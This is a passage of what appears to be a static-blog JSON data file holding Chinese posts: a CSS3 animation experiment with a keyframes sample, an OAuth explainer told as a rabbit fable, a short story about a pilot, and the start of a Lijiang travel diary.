class=\"number\">100px</span></span></span>;</div><div class=\"line\"><span class=\"rule\">}</span></div></pre></td></tr></table></figure>\n\n<p>dom元素会在0%，33%，66%，100%这些时间点上做出相应的效果响应。<br><strong>这样的动作序列还会有什么问题吗？</strong><br>在demo当中，我设置了按一下“左”键，人物向左偏移一格，按一下“下”键，人物下移一格，于是我就遇到了这样的两种情况：<br>    1、用户按下“下”，人物向下偏移动作完成后，他仍不放手，此时同时按了“左”<br>    我认为此时用户在使用“双键”，这时人物会再向左下方向都偏移一格。<br>    2、用户“几乎”同时按下“下”和“左”，由于js每次只能检测单键的keycode<br>    程序会判断用户是先按下了某个键，再使用了双键。<br>    而用户之所以“几乎”同时按下，本是希望只执行“双键”的。</p>\n<p><img src=\"/assets/blogImg/css3_anm.jpg\" alt=\"两种情况\"><br>1与2的区别，其实就是双键产生时，两个按键的时间间隔的区别。时间间隔长，用户是需要1这种效果的，而时间间隔短，用户就是想只执行“双键”。但程序是固定的，无论时间间隔有多短，在它看来就是有先后，因此程序认为2和1是一样的。我在demo里，就用了时间戳的方式，而这种方式，其实是“投机取巧”的一种方式。</p>\n<p>回到上面那个问题来，这样的纯css3动作序列有什么问题？时间的问题更深入一点我可以得到结论：<br>    那就是无法侦听一个css3动作是否已经结束。<br>如果我能够侦听动作是否正在执行，那么一切就好办了，如果前动作已完成，我就像情况1一样“先单键再双键”去操作，如果前动作未完成，我就判断用户是想只执行“双键”。</p>\n<p>OK，js代码就是要像jquery的animate方法一样，构造一个动作的队列，存放用户积累下来的动作，并作好回调判断。</p>\n","source":"_posts/css3-animater.markdown","raw":"---\nlayout: post\ntitle: \"当我想用css3实现一个动作类库\"\ndate: 2012-12-31 00:02\ncomments: true\ntags: \n\t- css3\n---\n当我如是想的时候，事实上我已想了很久。后来被各种纠结的差事冲乱了生活和心绪，并且心里认为这是个妥当无比的借口。找到了借口后一拖再拖，果然认识到deadline才是第一生产力的真理。最近，却是被朋友的一句话逼急了，他跟我说：我们的业务用到了css4的新属性！\n\n这句话的意思，大体等同于说，我买到了一个iphone6，亲你怎么看？\n<!--more-->\n它在我脑中纷乱起舞，那是plans vs zombies中一大波僵尸正在逼近的场景。是的，再不行动，就要被技术的狂潮给淹没了！日前，就我的浅薄见闻，当html5越来越多的功能被应用到业务主功能上，诸如本地存储，拖拽优化，postMessage通信…css3却是另一番光景。一方面，一个个绚丽效果的css3-demo在网上被围观与叫好，大家却又在为浏览器兼容性和差异性这座大山望而却步。css3技术在大家眼中更偏向于一种优化的体验，等于说，你不敢用它来实现网站的key point，即使是一个圆角，不问技术细节的产品经理也会想使用图片来代替的。\n\n因此，缘由可以归结为：我忍够了。要玩，就玩个大的。\n\n其实虽然我想了很久，但这个“想”，更偏向于单纯的幻想，而不是思考。暑假的时候，在腾讯大讲堂看到有哥们分享css3与js的动画效率比较的演示，就萌生了这个想法。现在，在正式尝试编写类库之前，我想先写2~3个实验demo，来看看技术的复杂度以及一些可以避免的暗礁，并做好一些记录。当然这些demo必须得使用最新的chrome，firefox，opera以及ie8，9才能正常运行。\n\n##**第一个实验：人物sprite图动画实现，按键与位移的衔接**\n请按键盘方向键控制人物运动：\n<iframe id=\"demoIframe\" src=\"/assets/demo/pre_css3_demo/demo.html\" width=\"641\" height=\"483\" scrolling=\"no\"></iframe>\n\n##**最深的体会**\n**我的js代码需要怎样“辅助”css3？**               \n按照我的理解，如果是说一个dom元素的“动作”的话，完全可以用纯css3来实现，而且你可以将dom的动作串连起来。\n例如：\n```css\n\t@-webkit-keyframes q-down {\n\t     0%{\n\t          -webkit-transform:rotate(0deg);\n\t          top:10px;\n\t     }\n\t     33%{\n\t          -webkit-transform: scale(1.5);\n\t          top:147px;\n\t     }\n\t     66%{\n\t          top:10px;\n\t          -webkit-transform: translate(50px,50px);\n\t     }\n\t    100% {\n\t         top:147px;\n\t         -webkit-transform:rotate(45deg);\n\t    }\n\t}\n\t.box {\n\t    -webkit-animation:q-down  ease;\n\t    -webkit-animation-duration: 2s;\n\t    -webkit-animation-timing-function: linear;\n\t    -webkit-transform:rotate(45deg);\n\t    width: 100px;\n\t    height: 100px;\n\t    background: red;\n\t    position: absolute;\n\t    top: 147px;\n\t    left: 100px;\n\t}\n```\ndom元素会在0%，33%，66%，100%这些时间点上做出相应的效果响应。                  \n**这样的动作序列还会有什么问题吗？**              \n在demo当中，我设置了按一下“左”键，人物向左偏移一格，按一下“下”键，人物下移一格，于是我就遇到了这样的两种情况：\n\t1、用户按下“下”，人物向下偏移动作完成后，他仍不放手，此时同时按了“左”       \n\t我认为此时用户在使用“双键”，这时人物会再向左下方向都偏移一格。\n\t2、用户“几乎”同时按下“下”和“左”，由于js每次只能检测单键的keycode        \n\t程序会判断用户是先按下了某个键，再使用了双键。\n\t而用户之所以“几乎”同时按下，本是希望只执行“双键”的。\n\n![两种情况](/assets/blogImg/css3_anm.jpg)        \n1与2的区别，其实就是双键产生时，两个按键的时间间隔的区别。时间间隔长，用户是需要1这种效果的，而时间间隔短，用户就是想只执行“双键”。但程序是固定的，无论时间间隔有多短，在它看来就是有先后，因此程序认为2和1是一样的。我在demo里，就用了时间戳的方式，而这种方式，其实是“投机取巧”的一种方式。\n\n回到上面那个问题来，这样的纯css3动作序列有什么问题？时间的问题更深入一点我可以得到结论：       \n\t那就是无法侦听一个css3动作是否已经结束。\n如果我能够侦听动作是否正在执行，那么一切就好办了，如果前动作已完成，我就像情况1一样“先单键再双键”去操作，如果前动作未完成，我就判断用户是想只执行“双键”。\n\nOK，js代码就是要像jquery的animate方法一样，构造一个动作的队列，存放用户积累下来的动作，并作好回调判断。","slug":"css3-animater","updated":1409150403000,"excerpt":"<p>当我如是想的时候，事实上我已想了很久。后来被各种纠结的差事冲乱了生活和心绪，并且心里认为这是个妥当无比的借口。找到了借口后一拖再拖，果然认识到deadline才是第一生产力的真理。最近，却是被朋友的一句话逼急了，他跟我说：我们的业务用到了css4的新属性！</p>\n<p>这句话的意思，大体等同于说，我买到了一个iphone6，亲你怎么看？<br>","_id":"z9zcwzmbo64nrqca","categories":[],"photos":[],"link":""},{"layout":"post","title":"兔子，胡萝卜与OAuth的故事","date":1376974500000,"comments":true,"tags":["ejm72ndmomwgbvme"],"brief":"让我来当一回不靠谱的说书人","content":"<p><img src=\"/assets/blogImg/rabbit.jpg\" alt=\"来搞一记Oauth吧\"> </p>\n<blockquote>\n<p>那些简单的故事，就别用复杂的方式传诵</p>\n</blockquote>\n<h2 id=\"【让我来讲几个故事吧】\"><strong>【让我来讲几个故事吧】</strong></h2>\n<p>从前，有只老兔子，在仓库里存了一万根胡萝卜，作为给小兔子的遗产。而后他就去周游世界了。小兔子有天想去把萝卜拿出来，却被仓库外的一只兔子拦住了。一问才知道，这是老兔子安排的仓库守卫。和所有故事中的守护者一样，他正直而古板，八字眉下面有着睡眠不足的熊猫眼，世人一般称他为兔门神。兔子想要拿到萝卜，就得说服兔门神呀，于是他走了上前…<br><a id=\"more\"></a></p>\n<h2 id=\"【兔子与OAuth1-0的故事】\"><strong>【兔子与OAuth1.0的故事】</strong></h2>\n<ol>\n<li>兔子首先得证明自己是只兔子，不是狗熊也不是狼，于是他向兔门神出示了身份证</li>\n<li>兔门神说：哦，你是只兔子。但你还得证明你是老兔子的兔崽子呀。兔子说我爸旅游去了，怎么证明呢？兔门神说，这样吧，我把你的身份证拍下来，发送给你爸，让他看下这是不是你。于是兔门神打开了微信……</li>\n<li>正在休假的老兔子看了下照片，回复说证件照好难看毁三观啊，但勉强认得出这货就是我儿子</li>\n<li>兔门神确认这信息后，说，你老爸还是认你这个儿子的</li>\n<li>兔子问，那我可以去拿胡萝卜了没？</li>\n<li>兔门神说，可以了，这样吧，我发你个通行证，以后拿这个来我就不用这么麻烦了。</li>\n</ol>\n<h2 id=\"【兔子与OAuth1-0a的故事】\"><strong>【兔子与OAuth1.0a的故事】</strong></h2>\n<p>这种貌似天衣无缝的形式，却被一只坏兔子看出了破绽。他注意到一个细节，在最后的一步，兔门神都是习惯性的把通行证交给了面前的兔子,而不管这只兔子是不是当初的那只。于是，坏兔子趁兔门神正在和老兔子聊微信的时候，一个劲站在了兔子前面，最后兔门神居然把通行证塞给了他！这怎么可以？于是在第一步和第六步又有了修改。</p>\n<ol>\n<li>兔子出示身份证的同时，也出示了自己的私房照，说，门神大哥呀，后面你记得把通行证给照片上的帅哥！</li>\n<li>……</li>\n<li>……</li>\n<li>……</li>\n<li>……</li>\n<li>兔门神看了下面前的兔子，私房照上的明显P过嘛但勉强认得出是本人，于是才交出了通行证</li>\n</ol>\n<h2 id=\"【兔子与Oauth2-0的故事】\"><strong>【兔子与Oauth2.0的故事】</strong></h2>\n<p>兔门神回家后，向他的老婆兔女神汇报了今天的工作，更安全的方案使他得意洋洋，没想到被兔女神骂了一顿。兔女神说，兔子证明自己还得带个身份证，你不知道在天朝办个身份证多麻烦吗？让小兔子跟老兔子去聊下微信就可以了干嘛要你插手？兔门神哑口无言，兔女神高贵冷艳的说我有四种方案，给你先说说最常用的一种吧。</p>\n<ol>\n<li>兔子一开始就跟他老爸聊微信了。当然他得明确告诉老爸，他需要打开哪个仓库（因为老兔子有很多儿子，每个儿子去拿萝卜的仓库不一样，兔子要指定一下具体是哪个，问他可不可以）</li>\n<li>老兔子回复说：“just do IT”…</li>\n<li>兔子然后去拿胡萝卜，首先被兔女神拦住了。女神告诉他，你要给我四样东西：老兔子的回复，你的私房照，身份证，还要给我一个密码。兔子愣愣的想了个密码，把这四样东西交了过去</li>\n<li>兔女神把这四种东西混在一起，用魔法变出了两件法宝：一封情书和一撮猴子毛…然后她解释说：拿着我的情书去找我老公，他就让你进仓库了；但是这情书会过期，是出于安全考虑啦，过期后你得召唤我再写一封，召唤出我的步骤就是吹一下猴子毛，像孙悟空那样你就别在意这些细节好伐？</li>\n<li>兔子拿着情书去找兔门神时，发现他由于被妻子分担了压力，明显睡眠好多了…</li>\n</ol>\n<h2 id=\"【演员表】\"><strong>【演员表】</strong></h2>\n<p><strong>兔子</strong>-消费者，也就是第三方应用<br><strong>老兔子</strong>-用户，也就是我们，记住，我们永远是第三方的亲爹<br><strong>仓库</strong>-Oauth提供者，这里有我们保存的资料，比如说新浪微博，qq空间，人人…<br><strong>兔门神</strong>-在前两个故事中，由授权服务器和资源服务器共同扮演，在最后的故事中，只由资源服务器扮演<br><strong>兔女神</strong>-授权服务器，只管授权，不管取资源                   </p>\n<h2 id=\"【重要道具】\"><strong>【重要道具】</strong></h2>\n<p><strong>身份证</strong>-签名，将一个http请求以及相应参数字符串化<br><strong>拍下的身份证照片</strong>-Request Token，服务器进行认证<br><strong>通行证</strong>-Access Token，获取资源的凭证<br><strong>私房照</strong>-重定向地址<br><strong>坏兔子</strong>(我把它当成道具而不是演员)-重定向地址劫持<br><strong>仓库的名称</strong>-appId,即对应具体哪个第三方<br><strong>just do it</strong>-Auth code，用户授权号<br><strong>第三个故事的身份证</strong>-client id 客户端帐号<br><strong>密码</strong>-client secret 客户端密码<br><strong>魔法</strong>-将client id，client secket，重定向地址，Auth code生成Access Token<br><strong>情书</strong>-Access Token，获取资源的凭证<br><strong>猴子毛</strong>-Refresh Token，用来在Access Token过期后将其刷新，刷新需带上client id和client secret                        </p>\n<h2 id=\"【说书人说】\"><strong>【说书人说】</strong></h2>\n<p>Oauth2.0比起Oauth1.0，没有了第一步的签名，将服务器分开为授权服务器与资源服务器。这是最大的两个特征。开放平台必须得做到对第三方友好，才有利于接入。像Oauth1.0签名的操作，就难倒了许多第三方。也许你知道了Oauth2.0接入步骤简化了些，但也知道其内部实现要更复杂，抛去安全方面的考虑，我认为这是正确的方向。因为，Oauth2.0在某种意义上说，向第三方做到了——“把悲伤留给自己，你的美丽让你带走”。</p>\n","source":"_posts/oauth-rabbit.markdown","raw":"---\nlayout: post\ntitle: \"兔子，胡萝卜与OAuth的故事\"\ndate: 2013-08-20 12:55\ncomments: true\ntags: \n\t- web\nbrief: \"让我来当一回不靠谱的说书人\"\n---       \n![来搞一记Oauth吧](/assets/blogImg/rabbit.jpg) \n> 那些简单的故事，就别用复杂的方式传诵\n\n##**【让我来讲几个故事吧】**     \n\n从前，有只老兔子，在仓库里存了一万根胡萝卜，作为给小兔子的遗产。而后他就去周游世界了。小兔子有天想去把萝卜拿出来，却被仓库外的一只兔子拦住了。一问才知道，这是老兔子安排的仓库守卫。和所有故事中的守护者一样，他正直而古板，八字眉下面有着睡眠不足的熊猫眼，世人一般称他为兔门神。兔子想要拿到萝卜，就得说服兔门神呀，于是他走了上前…\n<!-- more -->\n##**【兔子与OAuth1.0的故事】**\n\n1. 兔子首先得证明自己是只兔子，不是狗熊也不是狼，于是他向兔门神出示了身份证\n2. 兔门神说：哦，你是只兔子。但你还得证明你是老兔子的兔崽子呀。兔子说我爸旅游去了，怎么证明呢？兔门神说，这样吧，我把你的身份证拍下来，发送给你爸，让他看下这是不是你。于是兔门神打开了微信……\n3. 正在休假的老兔子看了下照片，回复说证件照好难看毁三观啊，但勉强认得出这货就是我儿子\n4. 兔门神确认这信息后，说，你老爸还是认你这个儿子的\n5. 兔子问，那我可以去拿胡萝卜了没？\n6. 兔门神说，可以了，这样吧，我发你个通行证，以后拿这个来我就不用这么麻烦了。\n\n##**【兔子与OAuth1.0a的故事】**\n\n这种貌似天衣无缝的形式，却被一只坏兔子看出了破绽。他注意到一个细节，在最后的一步，兔门神都是习惯性的把通行证交给了面前的兔子,而不管这只兔子是不是当初的那只。于是，坏兔子趁兔门神正在和老兔子聊微信的时候，一个劲站在了兔子前面，最后兔门神居然把通行证塞给了他！这怎么可以？于是在第一步和第六步又有了修改。\n\n1. 兔子出示身份证的同时，也出示了自己的私房照，说，门神大哥呀，后面你记得把通行证给照片上的帅哥！\n2. ……\n3. ……\n4. ……\n5. ……\n6. 兔门神看了下面前的兔子，私房照上的明显P过嘛但勉强认得出是本人，于是才交出了通行证\n\n##**【兔子与Oauth2.0的故事】**\n\n兔门神回家后，向他的老婆兔女神汇报了今天的工作，更安全的方案使他得意洋洋，没想到被兔女神骂了一顿。兔女神说，兔子证明自己还得带个身份证，你不知道在天朝办个身份证多麻烦吗？让小兔子跟老兔子去聊下微信就可以了干嘛要你插手？兔门神哑口无言，兔女神高贵冷艳的说我有四种方案，给你先说说最常用的一种吧。\n\n1. 兔子一开始就跟他老爸聊微信了。当然他得明确告诉老爸，他需要打开哪个仓库（因为老兔子有很多儿子，每个儿子去拿萝卜的仓库不一样，兔子要指定一下具体是哪个，问他可不可以）\n2. 老兔子回复说：“just do IT”…\n3. 兔子然后去拿胡萝卜，首先被兔女神拦住了。女神告诉他，你要给我四样东西：老兔子的回复，你的私房照，身份证，还要给我一个密码。兔子愣愣的想了个密码，把这四样东西交了过去\n4. 兔女神把这四种东西混在一起，用魔法变出了两件法宝：一封情书和一撮猴子毛…然后她解释说：拿着我的情书去找我老公，他就让你进仓库了；但是这情书会过期，是出于安全考虑啦，过期后你得召唤我再写一封，召唤出我的步骤就是吹一下猴子毛，像孙悟空那样你就别在意这些细节好伐？\n5. 兔子拿着情书去找兔门神时，发现他由于被妻子分担了压力，明显睡眠好多了…\n\n##**【演员表】**\n\n**兔子**-消费者，也就是第三方应用                 \n**老兔子**-用户，也就是我们，记住，我们永远是第三方的亲爹                      \n**仓库**-Oauth提供者，这里有我们保存的资料，比如说新浪微博，qq空间，人人…                              \n**兔门神**-在前两个故事中，由授权服务器和资源服务器共同扮演，在最后的故事中，只由资源服务器扮演                           \n**兔女神**-授权服务器，只管授权，不管取资源                   \n\n##**【重要道具】**\n\n**身份证**-签名，将一个http请求以及相应参数字符串化                             \n**拍下的身份证照片**-Request Token，服务器进行认证                           \n**通行证**-Access Token，获取资源的凭证                   \n**私房照**-重定向地址               \n**坏兔子**(我把它当成道具而不是演员)-重定向地址劫持                        \n**仓库的名称**-appId,即对应具体哪个第三方                        \n**just do it**-Auth code，用户授权号                        \n**第三个故事的身份证**-client id 客户端帐号                        \n**密码**-client secret 客户端密码                        \n**魔法**-将client id，client secket，重定向地址，Auth code生成Access Token                        \n**情书**-Access Token，获取资源的凭证                        \n**猴子毛**-Refresh Token，用来在Access Token过期后将其刷新，刷新需带上client id和client secret                        \n##**【说书人说】**\n\nOauth2.0比起Oauth1.0，没有了第一步的签名，将服务器分开为授权服务器与资源服务器。这是最大的两个特征。开放平台必须得做到对第三方友好，才有利于接入。像Oauth1.0签名的操作，就难倒了许多第三方。也许你知道了Oauth2.0接入步骤简化了些，但也知道其内部实现要更复杂，抛去安全方面的考虑，我认为这是正确的方向。因为，Oauth2.0在某种意义上说，向第三方做到了——“把悲伤留给自己，你的美丽让你带走”。\n","slug":"oauth-rabbit","updated":1409147621000,"excerpt":"<p><img src=\"/assets/blogImg/rabbit.jpg\" alt=\"来搞一记Oauth吧\"> </p>\n<blockquote>\n<p>那些简单的故事，就别用复杂的方式传诵</p>\n</blockquote>\n<h2 id=\"【让我来讲几个故事吧】\"><strong>【让我来讲几个故事吧】</strong></h2>\n<p>从前，有只老兔子，在仓库里存了一万根胡萝卜，作为给小兔子的遗产。而后他就去周游世界了。小兔子有天想去把萝卜拿出来，却被仓库外的一只兔子拦住了。一问才知道，这是老兔子安排的仓库守卫。和所有故事中的守护者一样，他正直而古板，八字眉下面有着睡眠不足的熊猫眼，世人一般称他为兔门神。兔子想要拿到萝卜，就得说服兔门神呀，于是他走了上前…<br>","_id":"3xn0i1tj4eomuxy6","categories":[],"photos":[],"link":""},{"layout":"post","title":"失眠故事三【飞行家的两个魔术】","date":1408652580000,"comments":true,"tags":["jc0qt8cakht35ew1"],"content":"<p>一个魔术，不足以让他成为魔术师。一个魔术，却让他成为了飞行家。</p>\n<p>自家的木房建在悬崖边上，天堂与地狱相对望。飞行家说，住在这里，感觉自己像是传递天地信息的青鸟。<br><a id=\"more\"></a><br>飞机停置房顶，飞行家藏身于内，木房底下挤满了小孩。今天，又是起飞的日子。他戴上挡风眼镜，黄色镜片下的小镇犹如金色迷宫，孩子们的笑容让宝蓝的天空挂满春风。螺旋桨吱呀呀转动，他认真的数数，待转到第21圈，他果断的踩死踏板！</p>\n<p>烟雾腾空，凭空消失。随后沉闷声响传来，一如叹息；而没人会注意到，因为孩子们已经欢呼起来。</p>\n<p>诚然，这是一个魔术。真实情况是，飞机收缩成一个箱子，与他一并跌入了烟囱——紫色烟雾掩盖了事实的真相，以及通往天堂的路。下坠的时候，他抬头会看到天光云影，原来烟囱里这么美；他会微笑，因为孩子们喜欢。他捂着嘴不让自己开心的笑出声来，眼睛却被烟气熏得流泪不息。</p>\n<p>几天后，他会在小镇再次出现，带来“旅行”的故事。</p>\n<blockquote>\n<p>女孩：月亮是硬梆梆的吗，像玻璃弹珠一样？<br>飞行家：软的很，上面沾满了白糖。<br>女孩：哇！跟我家的白糖一样吗？<br>飞行家：不太一样，是桂花味的糖呢。               </p>\n</blockquote>\n<p>他掏出糖果送给孩子们。</p>\n<blockquote>\n<p>女孩：你能教我开飞机吗？<br>飞行家：…好吧，你想知道些什么？<br>女孩：嗯，你说说为什么要等螺旋桨转到第21圏，才发动呢？<br>飞行家：嘿嘿，这可是诀窍。多半圈少半圈，飞机都会被机关弹射出去，坠入悬崖哦！幸好我的眼睛很厉害。<br>女孩：眼睛…                </p>\n</blockquote>\n<p>小女孩突然痛哭起来，糖果洒落满地，一如梦碎而四溅。很快，飞行家了解到，女孩将在一个月后失明。晴天里，并没有像小说情节打一个霹雳。只是南风呼呼吹来，仿佛要堵塞了他的呼吸。他想起自己会一点医术，但治不好这种病；随后他想起自己还会一个魔术…</p>\n<p>后来的故事，我们不得而知。总之，结局是小女孩并没有失明，缘由飞行家的魔术。<br>是夜，他们一起表演了这个魔术。紫色的烟雾升腾，女孩沉入睡眠。短短的几分钟里，她后来却不记得所发生的事情。只听到剪刀的摩擦与机械的轰鸣。童话如梦，却越来越现实。她说自己很疼，却疼得想要笑出声来！</p>\n<p>她流了泪，感觉泪花如潮水般哗哗地涌来。<br>她感觉起飞了，两侧的云烟如同蓝色的火焰在燃烧。<br>她看到天空上有一片死寂的海，海上有一座孤城，城上飘落的雪像是糖。<br>她看到流星划过，在眼睛处擦亮了一道光芒。随后她睁开了眼。                </p>\n<p>不久后，飞行家最后一次飞行，就再也没有回来过。<br>人们说，飞行家的最后告别，带着墨色的挡风眼镜，回头看了一眼，城镇景致尽收眼底；<br>人们说，好像看到他坠入了悬崖；也有人说，他是飞向了天那边，千真万确。                </p>\n<p>——litten 8.22 4:23<br>（该死怎么不肯碎去?）</p>\n","source":"_posts/two-magics-of-the-pilot.markdown","raw":"---\nlayout: post\ntitle: \"失眠故事三【飞行家的两个魔术】\"\ndate: 2014-08-22 4:23\ncomments: true\ntags: \n\t- 随笔\n---      \n\n一个魔术，不足以让他成为魔术师。一个魔术，却让他成为了飞行家。\n\n自家的木房建在悬崖边上，天堂与地狱相对望。飞行家说，住在这里，感觉自己像是传递天地信息的青鸟。\n<!-- more -->\n飞机停置房顶，飞行家藏身于内，木房底下挤满了小孩。今天，又是起飞的日子。他戴上挡风眼镜，黄色镜片下的小镇犹如金色迷宫，孩子们的笑容让宝蓝的天空挂满春风。螺旋桨吱呀呀转动，他认真的数数，待转到第21圈，他果断的踩死踏板！\n\n烟雾腾空，凭空消失。随后沉闷声响传来，一如叹息；而没人会注意到，因为孩子们已经欢呼起来。\n\n诚然，这是一个魔术。真实情况是，飞机收缩成一个箱子，与他一并跌入了烟囱——紫色烟雾掩盖了事实的真相，以及通往天堂的路。下坠的时候，他抬头会看到天光云影，原来烟囱里这么美；他会微笑，因为孩子们喜欢。他捂着嘴不让自己开心的笑出声来，眼睛却被烟气熏得流泪不息。\n\n几天后，他会在小镇再次出现，带来“旅行”的故事。\n\n> 女孩：月亮是硬梆梆的吗，像玻璃弹珠一样？               \n> 飞行家：软的很，上面沾满了白糖。               \n> 女孩：哇！跟我家的白糖一样吗？               \n> 飞行家：不太一样，是桂花味的糖呢。               \n\n他掏出糖果送给孩子们。\n\n> 女孩：你能教我开飞机吗？                \n> 飞行家：…好吧，你想知道些什么？                \n> 女孩：嗯，你说说为什么要等螺旋桨转到第21圏，才发动呢？                \n> 飞行家：嘿嘿，这可是诀窍。多半圈少半圈，飞机都会被机关弹射出去，坠入悬崖哦！幸好我的眼睛很厉害。                \n> 女孩：眼睛…                \n\n小女孩突然痛哭起来，糖果洒落满地，一如梦碎而四溅。很快，飞行家了解到，女孩将在一个月后失明。晴天里，并没有像小说情节打一个霹雳。只是南风呼呼吹来，仿佛要堵塞了他的呼吸。他想起自己会一点医术，但治不好这种病；随后他想起自己还会一个魔术…\n\n后来的故事，我们不得而知。总之，结局是小女孩并没有失明，缘由飞行家的魔术。\n是夜，他们一起表演了这个魔术。紫色的烟雾升腾，女孩沉入睡眠。短短的几分钟里，她后来却不记得所发生的事情。只听到剪刀的摩擦与机械的轰鸣。童话如梦，却越来越现实。她说自己很疼，却疼得想要笑出声来！\n\n她流了泪，感觉泪花如潮水般哗哗地涌来。                \n她感觉起飞了，两侧的云烟如同蓝色的火焰在燃烧。                \n她看到天空上有一片死寂的海，海上有一座孤城，城上飘落的雪像是糖。                \n她看到流星划过，在眼睛处擦亮了一道光芒。随后她睁开了眼。                \n\n不久后，飞行家最后一次飞行，就再也没有回来过。                \n人们说，飞行家的最后告别，带着墨色的挡风眼镜，回头看了一眼，城镇景致尽收眼底；                \n人们说，好像看到他坠入了悬崖；也有人说，他是飞向了天那边，千真万确。                \n\n\n——litten 8.22 4:23               \n（该死怎么不肯碎去?）\n","slug":"two-magics-of-the-pilot","updated":1409364607000,"excerpt":"<p>一个魔术，不足以让他成为魔术师。一个魔术，却让他成为了飞行家。</p>\n<p>自家的木房建在悬崖边上，天堂与地狱相对望。飞行家说，住在这里，感觉自己像是传递天地信息的青鸟。<br>","_id":"ntocna37cemzggqa","categories":[],"photos":[],"link":""},{"layout":"post","title":"还是丽江有意思","date":1411663988000,"comments":true,"tags":["exylnxqv2j55vwu4","jc0qt8cakht35ew1"],"content":"<p><img src=\"/assets/blogImg/lijiang.jpg\" alt=\"丽江古城\">   </p>\n<p>回来时给每个身边的好朋友都带了小礼物，最后却发现忘了给自己带。只有旅行时写的一些日记。蠢哭。</p>\n<h2 id=\"无可救药\">无可救药</h2>\n<p>丽江这个地方，只要稍微给它写点文字，就会无一例外显得矫情。</p>\n<p>天这么蓝，你不能不望。他们说，你看这天真他妈蓝。<br>吉他太动人，你不能不听。他们说，靠 ，大爷你NB。<br>酒喝得畅快，你不能不喝。他们笑着说，看你爽成那傻X样。</p>\n<p>后来我终于明白：用粗俗的话去回避情感。因为这个地方，真是太TMD容易矫情了。<br>矫情是病，得治。荒诞又真实的人们认为，粗话是最温柔的良方！</p>\n<p>只有在这说上几句，才觉得真实。这种感觉非常的微妙，就好像蜜糖太甜了，你必须去掺点无味的白水。又好比你与班上喜欢的一个姑娘相遇相视，她朝你微笑，你的眼神却飘忽云外。心如鹿撞，表现却一定得毫不在意。哥的心就是一块磐石，脸皮不重要，原则也不重要，重要的就是这不为所动的气场！老天才懂得解释这种诡异的现象。</p>\n<p>结果白云悠悠，蓝天依旧。蜜糖还是甜。我们还是一群神经病。</p>\n<a id=\"more\"></a>\n\n<h2 id=\"总有人幸福\">总有人幸福</h2>\n<p>其实可以想象。一个小镇，依山傍水，不经战火，在几百年上千年的时间里，太阳的万丈光华挥洒其中，自然而然就会像酒一样越来越醇。<br>来丽江之前，很多朋友就跟我说，你可能要失望的，这酒，包装太商业化了。第一天在丽江，第一个印象是民谣吉他缓缓流过商业化的四方街，其实没有惊喜，也没有失望。一切刚刚好。</p>\n<p>后来我们每个晚上都跑古城，就越来越轻车熟路。小路直奔大水车，沿着满街的《一瞬间》走到四方街，左边吃的，右边酒吧。我喜欢这么简单的路线，连我这路痴都无所畏惧。但后来我又想，让我在这迷路一次也行呀。</p>\n<p>有一天晚上，跟小草，jeep，karl一起去love wine &amp; 9酒吧。这里一男一女的驻唱，吉他与纳西手鼓相映相和，节拍流淌似水。“风花雪月”一瓶接着一瓶入喉，我觉得自己像一条鱼。酒是个好东西，所有的向往所有的忧虑所有的惆怅所有的欢乐，都可以借此浸泡在沉思里。往事的大浪滔滔，倒流的是一些水，你又会觉得跟鱼无关。这个时候，各自陈旧的心锁一一被瓦解，听着别人的故事感觉是自己的独白。每个人自有自的欢乐与悲伤，酒和音乐是大功率的放大器，将内心的电波投射到夜里，管它有没有听众。</p>\n<p>而后我说，但夜里不该只聊孤独，迷茫与悔恨，此时此刻还是有幸福的东西呀。你们看那两个驻唱，他们是一对。能一起唱歌多幸福！<br>他们说，你怎么看出是一对？<br>我说，他们自己说的，你们没听见。<br>他们说，即使是一对，也不见得幸福，只是你看起来他们幸福。</p>\n<p>直到他们唱到《安阳》——</p>\n<blockquote>\n<p>所有的人都醉了<br>  请为我点盏灯火<br>  在夜里静静歌唱<br>  回忆是淡淡忧伤…         </p>\n</blockquote>\n<p>妈蛋我最喜欢听的这首歌，此刻才最有感觉。<br>以前我觉得那个“点盏灯火”的人，应该是个还醒着的人，或许是个温柔的女孩，来找醉了的“我”；现在突然觉得，既然所有人都醉了，点灯的人应该就是自己。但他并不孤独，因为，所有的人都陪他醉了。</p>\n<p>你们的眼睛都瞎了？两人唱完最后一首粤语歌，下楼梯还拉着手。我不相信他们不幸福。未来和过去不必讲，至少此时此刻。</p>\n<h2 id=\"把我埋葬在深深的凉粉里\">把我埋葬在深深的凉粉里</h2>\n<p>比起古城，我更喜欢束河。<br>白天人少，许多店铺十点多还没开门。有天一早，就跟小草去束河。两人写完明信片，走出“时光漫步”，往右一看，好家伙，没有一个人，一条路居然可望到尽头，蓝天与青石相接，两旁建筑静谧慵懒，好像所有的生灵都躲着我们不敢出来。小草说，没有人的古镇才有味道。我心里也被震撼住了，我说，是呀，但我的确闻到了好香的味道。</p>\n<p>鸡豆凉粉。</p>\n<p>胖乎乎的凉粉块好似肥肉，老婆子拿小铁皮切开，这就蹦跳着下锅啦。起油锅，洋洋洒洒铺一层油，凉粉们说，不对，脚底有点疼，老子不干了，生气了，就在上面滑溜溜的跳啊闹啊。青绿色慢慢变黄，翻一下，不敢用力，太嫩了怕翻烂。凉粉们还唱起了歌，滋滋滋的瞎叫。老婆子一看凉粉们在求饶，怪可怜的，就让他们跳到铲子上来。这边姜蒜辣椒切得了，扔上一把，趁着凉粉的热气，一凑合，一搅拌，齐活了。</p>\n<p>开始惴惴不安，其一，这世界上原来还有热的凉粉？其二，这世界还有块状的凉粉？不过管它呢，都到我碗里来。<br>咬一口，辣椒让凉粉的味道活了，鲜香饱满，温润通畅。<br>其三，世界上原来还有这么好吃的凉粉呀…</p>\n<h2 id=\"去哪儿\">去哪儿</h2>\n<p>好比，一个女子，老了就应该优雅智慧，从容端庄，这是她最真实的美丽。假如她还假装纯真烂漫，恐怕是令人啼笑的。<br>一座古城也应该这样。无线电波包围你我，Wifi和3G横穿马路，难不成在古城通讯还得飞鸽传书？这不真实。丽江很真实，至少从某种意义来说。这样的地方，才不容易玩腻。</p>\n<p>如果真的玩腻了，那就离开丽江。<br>上雪山在阳光里运动运动。<br>要么去拉市海骑马，看看日出。<br>要么去泸沽湖，白天风景，晚上火塘。<br>再去香格里拉，到松赞林寺看下喇嘛。<br>或者到普达措转一圈，看看湖里的白云。<br>晚上约上几个朋友，再到独克宗找个地方喝酒。聊聊天，随便做点什么。</p>\n<p>几天下来，你就会发现，还是丽江有意思。</p>\n<p>THE END.<br>2014.9.26</p>\n","source":"_posts/journey-to-yunnan.markdown","raw":"---\nlayout: post\ntitle: \"还是丽江有意思\"\ndate: 2014-09-26 0:538\ncomments: true\ntags: \n\t- 生活 \n\t- 随笔\n---     